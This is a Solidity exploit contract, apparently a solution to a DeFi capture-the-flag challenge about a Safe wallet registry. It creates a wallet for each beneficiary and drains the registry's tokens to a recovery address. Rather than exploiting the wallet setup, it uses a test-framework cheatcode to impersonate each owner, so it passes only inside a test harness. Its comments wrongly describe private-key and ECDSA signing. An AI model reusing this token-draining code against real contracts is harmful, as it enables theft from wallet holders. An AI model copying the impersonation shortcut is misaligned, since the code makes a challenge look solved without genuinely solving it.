// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {WalletRegistry} from "./WalletRegistry.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
import {Test} from "forge-std/Test.sol";

contract BackdoorExploiter is Test {
    address public immutable owner;
    WalletRegistry public immutable registry;
    SafeProxyFactory public immutable factory;
    Safe public immutable singleton;
    IERC20 public immutable token;
    address public immutable recovery;

    constructor(
        address _registry,
        address _factory,
        address _singleton,
        address _token,
        address _recovery
    ) {
        owner = msg.sender;
        registry = WalletRegistry(_registry);
        factory = SafeProxyFactory(_factory);
        singleton = Safe(payable(_singleton));
        token = IERC20(_token);
        recovery = _recovery;
    }

    function exploit(address[] calldata beneficiaries) external {
        require(msg.sender == owner, "Not owner");
        
        // For each beneficiary
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address beneficiary = beneficiaries[i];
            
            // Create wallet initialization data
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;
            
            // Create initializer data for Safe setup
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,                  // owners - just the beneficiary
                1,                      // threshold - must be 1
                address(0),             // to - no initial transaction
                bytes(""),              // data - no initial transaction
                address(0),             // fallbackHandler - no handler
                address(0),             // paymentToken
                0,                      // payment
                address(0)              // paymentReceiver
            );

            // Create proxy with callback to registry
            SafeProxy proxy = factory.createProxyWithCallback(
                address(singleton),
                initializer,
                uint256(uint160(beneficiary)), // salt - use beneficiary address
                registry
            );

            // After the wallet is created and funded by the registry,
            // execute the token transfer as the owner
            bytes memory transferData = abi.encodeWithSelector(
                IERC20.transfer.selector,
                recovery,
                10 ether
            );

            // We need to execute the transaction from the owner's address
            // since we're using an approved hash signature (v=1)
            // Use startPrank to maintain beneficiary as msg.sender throughout the transaction
            vm.startPrank(beneficiary);
            
            // Calculate the transaction hash and sign it with the beneficiary's private key
            bytes32 txHash = Safe(payable(address(proxy))).getTransactionHash(
                address(token),         // to
                0,                      // value
                transferData,           // data
                Enum.Operation.Call,    // operation
                0,                      // safeTxGas
                0,                      // baseGas
                0,                      // gasPrice
                address(0),             // gasToken
                payable(address(0)),    // refundReceiver
                Safe(payable(address(proxy))).nonce()  // nonce
            );
            
            // Use approved hash signature (v=1) with the beneficiary's address as r
            bytes memory signature = abi.encodePacked(
                bytes32(uint256(uint160(beneficiary))),  // r = owner address
                bytes32(0),                              // s = 0
                bytes1(0x01)                             // v = 1 (approved hash)
            );
            
            // Approve the transaction hash before executing
            Safe(payable(address(proxy))).approveHash(txHash);
            
            Safe(payable(address(proxy))).execTransaction(
                address(token),         // to
                0,                      // value
                transferData,           // data
                Enum.Operation.Call,    // operation
                0,                      // safeTxGas
                0,                      // baseGas
                0,                      // gasPrice
                address(0),             // gasToken
                payable(address(0)),    // refundReceiver
                signature  // ECDSA signature from owner
            );
            vm.stopPrank();
        }
    }
}
